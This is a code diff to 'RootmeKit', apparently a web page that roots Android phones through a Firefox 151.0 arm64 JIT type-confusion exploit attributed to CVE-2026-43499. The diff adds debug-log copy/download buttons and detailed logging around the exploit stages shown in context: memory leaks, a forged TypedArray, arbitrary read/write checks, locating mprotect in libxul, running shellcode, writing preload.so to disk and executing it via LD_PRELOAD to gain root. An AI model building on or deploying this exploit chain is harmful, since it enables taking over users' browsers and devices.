@@ -57,6 +57,14 @@ body {
 .log-err { color: #ff6b6b; }
 .log-info { color: #82aaff; }
 .log-warn { color: #ffd866; }
+.debug-row { display: flex; gap: 10px; margin-top: 12px; }
+.dbg-btn {
+  flex: 1; padding: 9px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.15);
+  font-size: 12px; cursor: pointer; background: rgba(255,255,255,0.06); color: #aaa;
+  transition: all 0.2s; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 6px;
+}
+.dbg-btn:hover { background: rgba(255,255,255,0.14); color: #ddd; }
+.dbg-btn:active { transform: scale(0.97); }
 .version-tag {
   position: fixed; left: 14px; bottom: 12px; z-index: 100;
   font-size: 11px; color: #666; font-family: "SF Mono","Fira Code",monospace;
@@ -81,6 +89,10 @@ body {
   </div>
   <button class="start-btn" id="startBtn" disabled>开始 Root</button>
   <div class="terminal" id="terminal">等待操作...</div>
+  <div class="debug-row">
+    <button class="dbg-btn" onclick="copyDebugLog()">复制日志</button>
+    <button class="dbg-btn" onclick="downloadDebugLog()">下载日志</button>
+  </div>
 </div>
 
 <script>
@@ -100,11 +112,98 @@ function termLog(msg, cls) {
   terminalEl.appendChild(span);
   terminalEl.scrollTop = terminalEl.scrollHeight;
 }
-function logInfo(m)  { termLog('[*] ' + m, 'log-info'); }
-function logOk(m)    { termLog('[+] ' + m, 'log-ok'); }
-function logErr(m)   { termLog('[-] ' + m, 'log-err'); }
-function logWarn(m)  { termLog('[!] ' + m, 'log-warn'); }
-function logRaw(m)   { termLog(m, ''); }
+function logInfo(m)  { termLog('[*] ' + m, 'log-info'); dbgLog('[*] ' + m); }
+function logOk(m)    { termLog('[+] ' + m, 'log-ok'); dbgLog('[+] ' + m); }
+function logErr(m)   { termLog('[-] ' + m, 'log-err'); dbgLog('[-] ' + m); }
+function logWarn(m)  { termLog('[!] ' + m, 'log-warn'); dbgLog('[!] ' + m); }
+function logRaw(m)   { termLog(m, ''); dbgLog(m); }
+
+// ─── 详细调试日志系统 (可下载/复制, 用于后续调试) ─────────────────────────────
+const debugLogLines = [];
+const dbgStartTime = Date.now();
+dbgLog('══ RootmeKit v1.0 调试日志系统初始化 ══');
+dbgLog('页面加载完成, 等待用户操作...');
+
+function dbgLog(msg) {
+  const elapsed = ((Date.now() - dbgStartTime) / 1000).toFixed(3).padStart(8, ' ');
+  const ts = new Date().toISOString();
+  const line = '[' + ts + ' +' + elapsed + 's] ' + msg;
+  debugLogLines.push(line);
+  return line;
+}
+
+function dbgDump(label, obj) {
+  dbgLog('── ' + label + ' ──');
+  try {
+    const keys = Object.keys(obj);
+    for (const k of keys) {
+      let v = obj[k];
+      if (typeof v === 'bigint') v = '0x' + v.toString(16);
+      else if (v instanceof Uint8Array) v = '<Uint8Array len=' + v.length + '>';
+      else if (typeof v === 'object' && v !== null) {
+        try { v = JSON.stringify(v); } catch (e) { v = String(v); }
+      }
+      dbgLog('  ' + k + ' = ' + v);
+    }
+  } catch (e) {
+    dbgLog('  (dump failed: ' + e.message + ')');
+  }
+}
+
+function dbgHex(addr) {
+  return '0x' + addr.toString(16);
+}
+
+function buildDebugLogText() {
+  const header = [
+    '═══════════════════════════════════════════════════════════',
+    ' RootmeKit 详细调试日志',
+    ' 生成时间: ' + new Date().toISOString(),
+    ' 浏览器: ' + navigator.userAgent,
+    ' 页面URL: ' + location.href,
+    ' preload.so 大小: ' + (preloadSoData ? preloadSoData.length + ' bytes' : '未加载'),
+    '═══════════════════════════════════════════════════════════',
+    ''
+  ].join('\n');
+  return header + debugLogLines.join('\n');
+}
+
+function downloadDebugLog() {
+  const text = buildDebugLogText();
+  const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+  a.href = url;
+  a.download = 'rootmekit-debug-' + stamp + '.log';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+  logInfo('调试日志已下载');
+}
+
+async function copyDebugLog() {
+  const text = buildDebugLogText();
+  try {
+    await navigator.clipboard.writeText(text);
+    logInfo('调试日志已复制到剪贴板');
+  } catch (e) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try {
+      document.execCommand('copy');
+      logInfo('调试日志已复制到剪贴板');
+    } catch (e2) {
+      logErr('复制失败, 请改用下载: ' + e2.message);
+    }
+    document.body.removeChild(ta);
+  }
+}
 
 fileInput.addEventListener('change', function() {
   const file = this.files[0];
@@ -124,12 +223,15 @@ startBtn.addEventListener('click', function() {
   termClear();
   main().catch((e) => {
     logErr('Exploit 失败: ' + (e.message || e));
+    dbgLog('!!! UNCAUGHT ERROR !!! ' + (e && e.stack ? e.stack : String(e)));
+    dbgLog('>>> 详细日志已记录, 请点击"下载日志"保存后提供给开发者调试');
   });
 });
 
 // ─── Exploit core (from Rootme CVE-2026-43499) ────────────────────────────────
 
 function quit(code) {
+  dbgLog('!!! QUIT(' + code + ') !!! exploit 中止');
   throw new Error("quit(" + code + ")");
 }
 
@@ -533,6 +635,15 @@ async function main() {
     return;
   }
 
+  dbgLog('══ EXPLOIT START ══');
+  dbgDump('运行环境', {
+    userAgent: navigator.userAgent,
+    url: location.href,
+    platform: navigator.platform,
+    soSize: preloadSoData.length,
+    soHash: (function(){ let h=0; for(let i=0;i<preloadSoData.length;i++){h=((h*31)+preloadSoData[i])|0;} return '0x'+(h>>>0).toString(16); })()
+  });
+
   logInfo('开始 JIT Type Confusion exploit...');
   logInfo('目标: Firefox 151.0 arm64');
   logInfo('preload.so 大小: ' + preloadSoData.length + ' bytes');
@@ -552,6 +663,7 @@ async function main() {
   logOk('typed_shape=0x' + typedShape.toString(16));
   logOk('typed_empty_slots=0x' + typedEmptySlots.toString(16));
   logOk('typed_empty_elements=0x' + typedEmptyElements.toString(16));
+  dbgDump('Stage1 泄漏结果', { typedShape, typedEmptySlots, typedEmptyElements });
 
   // ── Stage 2: Leak carrier object and set up fake object ──
   logInfo('[2/7] 分配 Carrier 对象并构造伪造 TypedArray...');
@@ -566,6 +678,7 @@ async function main() {
   forgedObjectAddress = fakeObject;
   logOk('carrier_slots=0x' + carrierSlots.toString(16));
   logOk('fake_object=0x' + fakeObject.toString(16));
+  dbgDump('Stage2 Carrier', { carrierSlots, fakeObject, writeTarget, CARRIER_FIXED_SLOTS });
 
   function installFakeTypedArrayLayout() {
     setFakeWord(0, typedShape);
@@ -593,9 +706,11 @@ async function main() {
   const foundWriteForgeK = after === BigInt(writeProbeValue) ? forgeWriteFinalK : -1;
   if (foundWriteForgeK < 0) {
     logErr('AAW 验证失败');
+    dbgDump('Stage3 AAW 失败', { probeValue: writeProbeValue, afterValue: after, expected: writeProbeValue, actual: after });
     quit(2);
   }
   logOk('AAW_READY');
+  dbgLog('[Stage3] AAW 验证通过, writeForgeK=' + forgeWriteFinalK + ', after=' + dbgHex(after));
   if (stopAt("aaw")) return;
 
   // ── Stage 4: Verify AAR (Arbitrary Address Read) ──
@@ -607,9 +722,11 @@ async function main() {
   const foundReadForgeK = directRead === 0x52 ? forgeReadFinalK : -1;
   if (foundReadForgeK < 0) {
     logErr('AAR 验证失败');
+    dbgDump('Stage4 AAR 失败', { expected: 0x52, actual: directRead });
     quit(4);
   }
   logOk('AAR_READY');
+  dbgLog('[Stage4] AAR 验证通过, readForgeK=' + forgeReadFinalK + ', directRead=0x' + directRead.toString(16));
   if (stopAt("aar")) return;
 
   function readByte(addr) {
@@ -688,6 +805,14 @@ async function main() {
   requireAlignedPtr(mprotectPtr, 0x3n, 43);
   logOk('js_base=0x' + jsBase.toString(16));
   logOk('mprotect=0x' + mprotectPtr.toString(16));
+  dbgDump('Stage5 libxul 定位', {
+    arrayIsArrayAddr: leakFunctionAddr,
+    nativeFunc: leakFunctionNative,
+    ARRAY_ISARRAY_NATIVE_OFF,
+    jsBase,
+    MPROTECT_GOT_OFF,
+    mprotectPtr
+  });
   if (stopAt("libxul")) return;
 
   // ── Stage 6: Set up shellcode + WASM execution ──
@@ -918,6 +1043,7 @@ async function main() {
     quit(1);
   }
   logOk('MPROTECT_READY');
+  dbgDump('Stage6 mprotect', { shellAddr, shellOffset, mprotectRet, shellBufLen: shellBuf.length });
   if (stopAt("mprotect")) return;
 
   // Step 2: call shellcode
@@ -980,9 +1106,15 @@ async function main() {
   );
   if (initWriteResult.output.indexOf("OK") !== 0) {
     logErr('创建目标文件失败: ' + initWriteResult.output);
+    dbgDump('Stage7 创建文件失败', {
+      PRIVATE_DIR, PRELOAD_TARGET,
+      output: initWriteResult.output,
+      note: 'Firefox untrusted_app 域可能无权写此目录, 请确认路径正确'
+    });
     quit(52);
   }
   logOk('目标文件已创建: ' + PRELOAD_TARGET);
+  dbgLog('[Stage7] 目标文件创建成功: ' + PRELOAD_TARGET);
 
   // Write preload.so in chunks via base64
   let totalWritten = 0;
@@ -1001,11 +1133,13 @@ async function main() {
     );
     if (writeResult.output.indexOf("OK") !== 0) {
       logErr('写入块失败');
+      dbgDump('Stage7 写入块失败', { offset: totalWritten, chunkLen: bytes.length, output: writeResult.output });
       quit(53);
     }
   };
 
   logInfo('写入 preload.so (' + preloadSoData.length + ' bytes)...');
+  dbgLog('[Stage7] 开始分块写入, 总大小=' + preloadSoData.length + ', CHUNK_SIZE=' + CHUNK_SIZE);
   for (let offset = 0; offset < preloadSoData.length; offset += CHUNK_SIZE) {
     const end = Math.min(offset + CHUNK_SIZE, preloadSoData.length);
     writeChunk(preloadSoData.subarray(offset, end));
@@ -1014,6 +1148,7 @@ async function main() {
     logRaw('  写入进度: ' + totalWritten + '/' + preloadSoData.length + ' (' + pct + '%)');
   }
   logOk('preload.so 写入完成 (' + totalWritten + ' bytes)');
+  dbgLog('[Stage7] 写入完成, totalWritten=' + totalWritten);
 
   // Verify file size
   const verifyResult = runCaptureCommand(
@@ -1021,7 +1156,9 @@ async function main() {
       "; /system/bin/ls -l \"$file\" | /system/bin/awk '{print $5}'",
     14
   );
-  logInfo('文件大小验证: ' + verifyResult.output.trim() + ' bytes');
+  const verifiedSize = verifyResult.output.trim();
+  logInfo('文件大小验证: ' + verifiedSize + ' bytes');
+  dbgDump('Stage7 文件验证', { expected: preloadSoData.length, actual: verifiedSize, match: String(preloadSoData.length) === verifiedSize });
 
   // Execute with LD_PRELOAD
   const ROOT_CMD = "id; echo ROOT_SUCCESS";
@@ -1049,6 +1186,7 @@ async function main() {
       "; /system/bin/printf %s \"$status\" > \"$done\"",
     12
   );
+  dbgDump('Stage7 执行命令', { preloadTarget: PRELOAD_TARGET, out: commandOutputTarget, done: commandDoneTarget, method: 'LD_PRELOAD env' });
 
   // Poll for result
   let commandOutput = "";
@@ -1087,6 +1225,15 @@ async function main() {
     logRaw('  等待执行结果... (' + pollCount + ')');
   }
   commandOutput = commandOutput.trim();
+
+  dbgDump('Stage7 最终结果', {
+    commandOutput,
+    commandStatus,
+    pollCount,
+    pollRet: commandPollResult.ret,
+    hasRootSuccess: commandOutput.indexOf('ROOT_SUCCESS') >= 0,
+    hasUid0: commandOutput.indexOf('uid=0') >= 0
+  });
 
   // Display final output
   logOk('═══════════════════════════════════');
